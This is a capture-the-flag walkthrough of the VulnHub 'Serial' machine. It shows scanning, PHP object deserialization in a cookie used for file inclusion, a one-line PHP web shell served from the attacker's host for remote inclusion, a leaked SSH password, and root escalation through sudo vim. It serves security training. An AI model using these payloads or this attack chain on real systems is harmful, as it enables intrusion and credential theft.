Serial -  PHP Serialization in cookie

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Content Discovery of source files php
[+] Serialization on localhost and remote host
[+] Serialization in the cookie 
[+] PHP reverse Shell
[+] Privilege Escalation abusing SUDO rights /usr/bin/vim
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.107
Host is up (0.00075s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:f2:95:6a:f2:97:e0:ff:9f:68:14:a0:3a:d8:e2:eb (RSA)
|   256 e0:1e:cf:6f:29:4e:09:bb:df:4a:08:08:44:d4:f0:49 (ECDSA)
|_  256 38:28:63:c6:e4:bc:38:7e:6f:c2:72:b3:42:26:17:22 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Ubuntu))
|_http-server-header: Apache/2.4.38 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:8E:04:D1 (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Dirb Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# dirb http://192.168.56.107

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Oct 25 06:43:58 2019
URL_BASE: http://192.168.56.107/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.107/ ----
==> DIRECTORY: http://192.168.56.107/backup/                                                                                                                   
+ http://192.168.56.107/index.php (CODE:200|SIZE:52)                                                                                                           
+ http://192.168.56.107/server-status (CODE:403|SIZE:302)                                                                                                      
                                                                                                                                                               
---- Entering directory: http://192.168.56.107/backup/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Browsing to http://192.168.56.107/

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# curl http://192.168.56.107
Hello sk4This is a beta test for new cookie handler

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Looking at the cookies sent to the server

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Serial/serial1.png)


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# echo 'Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086NzoiV2VsY29tZSI6MDp7fX0%3D' | base64 -d
O:4:"User":2:{s:10:"Username";s:3:"sk4";s:9:"Userwel";O:7:"Welcome":0:{}}base64: invalid input

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Downloading the backup.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# wget http://192.168.56.107/backup/bak.zip
--2019-10-25 06:45:30--  http://192.168.56.107/backup/bak.zip
Connecting to 192.168.56.107:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1009 [application/zip]
Saving to: ‘bak.zip’

bak.zip                                 100%[===============================================================================>]    1009  --.-KB/s    in 0s      

2019-10-25 06:45:30 (34.7 MB/s) - ‘bak.zip’ saved [1009/1009]

root@setrus:~# unzip bak.zip 
Archive:  bak.zip
  inflating: index.php               
  inflating: log.class.php           
  inflating: user.class.php 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


After reading the code from the php files the final fiels are:

user.class.php


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# cat user.class.php 
<?php
  include("log.class.php");

  class Welcome {
    public function handler($val) {
      echo "Hello " . $val;
    }
  }

  class User {
    private $name;
    private $wel;

    function __construct($name) {
      $this->name = $name;
      $this->wel = new Log();
    }

    function __destruct() {
      //echo "bye\n";
      $this->wel->handler($this->name);
    }
  }
echo base64_encode(serialize(new User('setrus')));
?>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


log.class.php

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# cat log.class.php 
<?php
  class Log {
    private $type_log="/etc/passwd";

    function __costruct($hnd) {
      $this->$type_log = $hnd;
    }

    public function handler($val) {
      include($this->type_log);
      echo "LOG: " . $val;
    }
  }
?>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Testing serialization

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# php user.class.php
LOG: setrusTzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjY6InNldHJ1cyI7czo5OiIAVXNlcgB3ZWwiO086MzoiTG9nIjoxOntzOjEzOiIATG9nAHR5cGVfbG9nIjtzOjExOiIvZXRjL3Bhc3N3ZCI7fX0=
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Testing the serialization on the server:

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Serial/serial2.png)

Modifying the log file to include something from kali .


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# service apache2 start
root@setrus:~# ls -al /var/www/html/cmd_shell.php 
-rw-r--r-- 1 root root 31 Oct 25 07:02 /var/www/html/cmd_shell.php
root@setrus:~# cat /var/www/html/cmd_shell.php
<?php system($_GET["cmd"]); ?>
root@setrus:~# 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Modifying the log.class.php

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/# cat log.class.php 
<?php
  class Log {
   // private $type_log="/etc/passwd";
//    private $type_log="http://192.168.56.102/cmd_shell.php";
    private $type_log="/credentials.txt.bak";  
  function __costruct($hnd) {
      $this->$type_log = $hnd;
    }

    public function handler($val) {
      include($this->type_log);
      echo "LOG: " . $val;
    }
  }
?>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We get the credentials to login to the server

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Serial/serial3.png)


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sk4:KywZmnPWW6tTbW5w
LOG: setrusThis is a beta test for new cookie handler

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh sk4@192.168.56.107
sk4@192.168.56.107's password: 
Welcome to Ubuntu 19.04 (GNU/Linux 5.0.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


0 updates can be installed immediately.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings

Last login: Tue Aug 20 11:23:45 2019 from 192.168.1.5
sk4@sk4-VM:~$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege Escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sk4@sk4-VM:~$ sudo -l
Matching Defaults entries for sk4 on sk4-VM:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sk4 may run the following commands on sk4-VM:
    (ALL) NOPASSWD: /usr/bin/vim
sk4@sk4-VM:~$ sudo /usr/bin/vim

root@sk4-VM:~# id
uid=0(root) gid=0(root) groups=0(root)
root@sk4-VM:~# 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~









